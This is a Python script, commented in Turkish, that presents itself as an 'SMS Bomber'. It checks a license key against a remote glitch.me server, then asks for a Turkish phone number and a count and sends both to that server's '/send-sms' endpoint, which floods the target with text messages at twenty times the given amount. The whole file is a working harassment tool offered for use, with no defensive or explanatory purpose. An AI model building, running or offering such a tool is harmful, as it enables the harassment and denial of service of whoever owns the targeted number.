import requests
import colorama
import json
import time
import os
import ctypes
from colorama import Fore, Back, Style
from time import sleep


os.system("cls")
# Başlık belirleme
new_title = "Hoşgeldiniz! / SMS Bomber v1.1 by CGNUSL"

# Konsol penceresine başlığı uygula


password_url = "https://careful-charming-trigonometry.glitch.me/getpass"

# GET isteği gönder
response = requests.get(password_url)

# Yanıtı kontrol et
if response.status_code == 200:
    # Uzak sunucudan alınan şifreyi ve hoşgeldin mesajını kullan
    accounts_data = response.json().get("accounts")
    
    # Kullanıcıdan anahtarı al
    input_key = input("Anahtarı girin: ")

    # Anahtara karşılık gelen hesabı kontrol et
    matching_account = next((account for account in accounts_data if account["secret_key"] == input_key), None)

    # Anahtarı kontrol et
    if matching_account:
        username = matching_account.get("username", "Bilinmeyen Kullanıcı")  # Örnek olarak "Bilinmeyen Kullanıcı" belirtildi.
        print(f"Giriş başarılı! Hoşgeldiniz " + Fore.YELLOW + f"{username}" + Fore.RESET + " program hemen çalışacaktır.")
        sleep(3)
        os.system("cls")
        # Burada giriş başarılı olduğu için devam eden kodları ekleyebilirsiniz.
    else:
        print("Hatalı anahtar. Program kapatılıyor.")
        sleep(5)
        print(Fore.RESET)
        exit()


print(Fore.BLUE + "SMS Bomber'a Hoşgeldiniz! Bu program CGNUSL tarafından yapılmıştır. \nDiscord: cgnusl Öneri veya programdaki sıkıntılar için ulaşabilirsiniz.\n")
# Kullanıcıdan bilgileri al
telefon = input(Fore.BLUE + 'Numara girin: +90:' + Fore.RESET)
miktar = input(Fore.BLUE + "Miktar(Uyarı! yazılan miktarın 20 katı istek gider): " + Fore.RESET)
print("")

# Değerleri kontrol et
if not telefon or not miktar:
    print("Hatalı giriş! Numara ve miktar boş olamaz.")
    exit()

# POST verilerini oluştur
data = {
    "telefon": telefon,
    "miktar": miktar
}

url = "https://careful-charming-trigonometry.glitch.me/send-sms"

response = requests.post(url, data=data)

# Yanıtı kontrol et
if response.status_code == 200:
    print(Fore.GREEN + 'İstek alındı sms yollanmaya başlanıyor.' + response.text)
    print(Fore.RESET)
else:
    print(Fore.RED + 'İstek başarısız oldu. Status Code:', response.status_code)
    print(response.text)
    print(Fore.RESET)

sleep(5)
print(Fore.GREEN + "İşlem tamamlandı. Çıkmak için Enter tuşuna basın.")
print(Fore.RESET)
input()
